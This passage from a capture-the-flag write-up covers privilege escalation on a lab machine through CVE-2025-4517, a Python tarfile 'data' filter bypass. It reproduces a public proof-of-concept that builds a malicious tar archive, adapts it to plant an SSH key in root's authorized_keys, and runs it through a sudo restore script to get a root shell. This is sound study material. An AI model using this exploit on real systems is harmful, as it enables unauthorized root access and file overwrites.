        tar.extractall(path=staging_dir, filter="data")
    print(f"[+] Extraction completed in {staging_dir}")
except (tarfile.TarError, OSError, Exception) as e:
    print(f"[!] Error during extraction: {e}", file=sys.stderr)
    sys.exit(2)
```

It’s worth noting that the `tar.extractall()` call passes `filter="data"`, a new [feature](https://docs.python.org/3/library/tarfile.html#extraction-filters) added in Python 3.12. It takes the following options:

- `fully_trusted` - Honor all metadata as specified in the archive. Should be used if the user trusts the archive completely, or implements their own complex verification.
- `tar` - Honor most *tar* -specific features (i.e. features of UNIX-like filesystems), but block features that are very likely to be surprising or malicious.
- `data` - Ignore or block most features specific to UNIX-like filesystems. Intended for extracting cross-platform data archives.

#### Python

The python version on the box is 3.12.3:

```
wacky@wingdata:/$ python3 --version
Python 3.12.3
```

It’s also in a really unusual location:

```
wacky@wingdata:~$ which python3
/usr/local/bin/python3
```

That means this is a locally-compiled/installed binary, not a system package, which would be in `/usr/bin`. In fact, there is a copy there as well:

```
wacky@wingdata:~$ ls -l /usr/bin/python3*
lrwxrwxrwx 1 root root      10 Apr  9  2023 /usr/bin/python3 -> python3.11
-rwxr-xr-x 1 root root 6831736 Apr 28  2025 /usr/bin/python3.11
```

The Python 3.11 in `/usr/bin` is Debian 12’s installed Python. The Python is `/usr/local/bin` was built there likely using the `make install` command, leaving `-config` files behind:

```
wacky@wingdata:~$ ls -l /usr/local/bin/python3*
lrwxrwxrwx 1 root root       10 Nov  3  2025 /usr/local/bin/python3 -> python3.12
-rwxr-xr-x 1 root root 31280440 Nov  3  2025 /usr/local/bin/python3.12
-rwxr-xr-x 1 root root     3026 Nov  3  2025 /usr/local/bin/python3.12-config
lrwxrwxrwx 1 root root       17 Nov  3  2025 /usr/local/bin/python3-config -> python3.12-config
```

The fact that this is a 32MB binary also suggests it’s statically compiled (not that that’s important to solving WingData).

### CVE-2025-4517

#### Identify

Reading the script above, my first thought is that I should be able to do some kind of arbitrary write. But the script has this locked down very well. I can’t really control the input or output names enough to do anything useful, and the tar extraction seems to be done safely.

It does seem clear that tar has something to do with it, and the Python version is important.

Searching for “python 3.12.3 tarfile cve” returns information on several 2025 CVEs:

![image-20260619083648444](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260619083648444.webp)

There were five CVEs disclosed in a single [post](https://mail.python.org/archives/list/security-announce@python.org/thread/MAXIJJCUUMCL7ATZNDVEGGHUMQMUUKLG/) by Seth Larson:

| CVE | Severity | Primitive |
| --- | --- | --- |
| CVE-2025-4517 | Critical | Arbitrary file write (with contents) outside the extraction dir, via a `realpath` / `PATH_MAX` overflow |
| CVE-2025-4330 | High | Symlink whose target points outside the dir, plus some metadata modification |
| CVE-2025-4138 | High | Creates a symlink itself outside the extraction dir |
| CVE-2025-4435 | High | With `errorlevel=0`, filtered members are extracted instead of skipped |
| CVE-2024-12718 | Moderate | Modify metadata/permissions of files outside the extraction dir |

The interesting one here is CVE-2025-4517, which gives a direct arbitrary file write as the user running the script.

#### Details

NIST describes [CVE-2025-4517](https://nvd.nist.gov/vuln/detail/CVE-2025-4517) as:

> Allows arbitrary filesystem writes outside the extraction directory during extraction with filter=”data”. You are affected by this vulnerability if using the tarfile module to extract untrusted tar archives using TarFile.extractall() or TarFile.extract() using the filter= parameter with a value of “data” or “tar”. See the tarfile extraction filters documentation https://docs.python.org/3/library/tarfile.html#tarfile-extraction-filter for more information. Note that for Python 3.14 or later the default value of filter= changed from “no filtering” to \`“data”, so if you are relying on this new default behavior then your usage is also affected. Note that none of these vulnerabilities significantly affect the installation of source distributions which are tar archives as source distributions already allow arbitrary code execution during the build process. However when evaluating source distributions it’s important to avoid installing source distributions with suspicious links.

The `data` filter is supposed to guarantee that no extracted member (or link target) escapes the destination directory. For link members it does a containment check that boils down to resolving the target with `os.path.realpath()` and confirming the result is still inside the extraction directory.

`os.path.realpath()` walks the path component by component, and when a component is a symlink it `lstat` s it and follows it. Crucially, it runs in non-strict mode, so if an OS call fails, it does not fail, but silently stops resolving and appends the remaining components literally.

If I can force the path being resolved to blow past `PATH_MAX` *before* `realpath` reaches the malicious symlink, that symlink never gets followed during the check. The filter sees a literal, inside-the-destination-looking path and approves it, but the real filesystem operations during extraction *do* follow the link, landing outside.

[This](https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f) GitHub advisory on the vulnerability has details and a POC. It starts with “hello world” in `flag/flag` and no other files in `flag/`. The POC’s job is to manufacture a path long enough to trip `ENAMETOOLONG` at exactly the right spot to overwrite `flag/flag` and write a new file into `flag`.

The POC builds the malicious archive in `poc.tar`. First it picks the component sizes and builds a chain of long directories and symlinks:

```python
import tarfile
import os
import io
import sys
# 247 (55 on OSX) picked so the expanded path of dirs is 3968 bytes long (or 896
# on OSX), leaving 128 bytes for a prefix and at least a few chars of the link
comp = 'd' * (55 if sys.platform == 'darwin' else 247)
steps = "abcdefghijklmnop"
path = ""
with tarfile.open("poc.tar", mode="x") as tar:
    # populate the symlinks and dirs that expand in os.path.realpath()
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
...[snip]...
```

`comp` is a single very long directory name (247 `d` s on Linux). 247 is chosen so that 16 of them expand to ~3968 bytes, leaving ~128 bytes of headroom under the 4096 `PATH_MAX` for a prefix plus a few characters of the final link name. `steps` is 16 single-letter names (`a` - `p`), which become the 16 symlinks in the chain.

Each iteration of the loop creates a pair: a directory with the long name `comp`, and a symlink (`a`, then `b`, etc.) pointing at it. So traversing `a/b/c/.../p` means following 16 symlinks, each expanding to a 247-char directory name. By the time `realpath` has resolved all 16, the accumulated path is ~3968 bytes, right up against `PATH_MAX`. This chain is entirely legitimate and stays inside the destination; its only purpose is to inflate the resolved path length.

Next it drops the symlink that actually triggers the bypass:

```python
...[snip]...
    # create the final symlink that exceeds PATH_MAX and simply points to the
    # top dir. this allows *any* path to be appended.
    # this link will never be expanded by os.path.realpath(), nor anything after it.
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
...[snip]...
```

`linkpath` places a symlink named `llll...` (254 chars) at the end of the long chain (`a/b/.../p/`). Appending those 254 chars to the already-~3968-byte resolved path pushes it over `PATH_MAX`. When `realpath` tries to `lstat` this, it gets `ENAMETOOLONG`, gives up, and appends the rest literally, so this symlink is never expanded.

The resulting target is 16 `../` (where 16 is the number of directories in the loop earlier), ending up back in the original base directory. Now it can point a symlink outside the destination:

```python
...[snip]...
    # make a symlink outside to keep the tar command happy
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../flag"
    tar.addfile(e)
...[snip]...
```

`escape` is a top-level symlink whose target routes *through* the overflow link: `a/b/.../p/<254l>/../flag`. At extraction time the OS follows `<254l>` (to the destination root) and then `../flag`, resolving to `flag` one level above the destination, outside the sandbox. It also keeps the regular `tar` tool happy.

With that escape in place, it creates a hardlink through it:

```python
...[snip]...
    # use the symlinks above, that are not checked, to create a hardlink
    # to a file outside of the destination path
    f = tarfile.TarInfo("flaglink")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/flag"
    tar.addfile(f)
...[snip]...
```

`flaglink` is a hardlink whose target path goes through `escape` to the out-of-bounds `flag`. The filter resolves `escape/flag` but is fooled by the overflow trick, so it allows a hardlink to a file outside the destination.

Now that `flaglink` points at the external file, writing a regular file member with the same name overwrites it:

```python
...[snip]...
    # now that we have the hardlink we can overwrite the file
    content = b"overwrite\n"
    c = tarfile.TarInfo("flaglink")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))
...[snip]...
```

A regular file member, also named `flaglink`, writes its contents through the hardlink, overwriting the external `flag/flag` with `overwrite\n`. That’s the arbitrary-write primitive.

Finally, it shows this isn’t limited to clobbering existing files:

```python
...[snip]...
    # we can also create new files as well!
    content = b"new!\n"
    n = tarfile.TarInfo("escape/newfile")
    n.type = tarfile.REGTYPE
    n.size = len(content)
    tar.addfile(n, fileobj=io.BytesIO(content))
```

`escape/newfile` writes through the `escape` symlink to create a brand-new file in the external directory it points to.

All of this generates a `.tar` archive that when decompressed will bypass the filter.

#### Exploit

I’ll update the POC to overwrite the root user’s `authorized_keys` file by changing four blocks:

```
wacky@wingdata:/tmp$ diff orig.py poc.py 
10c10
< with tarfile.open("poc.tar", mode="x") as tar:
---
> with tarfile.open("/opt/backup_clients/backups/backup_223.tar", mode="x") as tar:
32c32
<     e.linkname = linkpath + "/../flag"
---
>     e.linkname = linkpath + "/../../../../root"
34,42c34,36
<     # use the symlinks above, that are not checked, to create a hardlink
<     # to a file outside of the destination path
<     f = tarfile.TarInfo("flaglink")
<     f.type = tarfile.LNKTYPE
<     f.linkname =  "escape/flag"
<     tar.addfile(f)
<     # now that we have the hardlink we can overwrite the file
<     content = b"overwrite\n"
<     c = tarfile.TarInfo("flaglink")
---
>     
>     content = b"\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing\n"
>     c = tarfile.TarInfo("escape/.ssh/authorized_keys")
46,51d39
<     # we can also create new files as well!
<     content = b"new!\n"
<     n = tarfile.TarInfo("escape/newfile")
<     n.type = tarfile.REGTYPE
<     n.size = len(content)
<     tar.addfile(n, fileobj=io.BytesIO(content))
```

The changes are:

1. Changing the output file to where it must be in order to be accepted by `restore_backup_clients.py`.
2. Rather than escaping to one directory up and then into `flag`, I’ll escape back to root’s home directory.
3. Rather than using a hardlink to overwrite, I’ll just write a regular file directly through the `escape` symlink, naming the member `escape/.ssh/authorized_keys`. The hardlink approach needs its target to already exist (`os.link` fails with `linkname not found` otherwise), and I don’t know at this point if root’s `authorized_keys` exists or not. A `REGTYPE` member written through the symlink creates the file if it’s absent (or overwrites it if present), and because the path runs through `escape` (pointing at `/root`), `tarfile` ’s own `makedirs` will create `/root/.ssh` first if it’s missing too.
4. Delete the extra new file creation.

I’ll run the `poc.py` and then the `sudo` command to have it do the exploitation:

```
wacky@wingdata:/tmp$ python3 poc.py 
wacky@wingdata:/tmp$ sudo python3 /opt/backup_clients/restore_backup_clients.py -b backup_223.tar -r restore_0xdf
[+] Backup: backup_223.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_0xdf
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_0xdf
```

it reports success, and I can SSH as root:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@wingdata.htb 
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64
...[snip]...
root@wingdata:~#
```

And get the root flag:

```
root@wingdata:~# cat root.txt
4cb2f067************************
```
